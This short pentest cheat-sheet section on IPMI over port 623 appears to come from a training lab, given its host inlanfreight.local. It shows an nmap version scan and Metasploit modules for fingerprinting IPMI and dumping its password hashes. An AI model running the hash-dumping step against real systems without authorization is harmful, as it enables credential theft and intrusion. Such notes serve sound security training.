##### Port 623
#### Version
```bash
nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

```msf
msf6 > use auxiliary/scanner/ipmi/ipmi_version
```

#### Metasploit Dumping Hashes
```msf
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
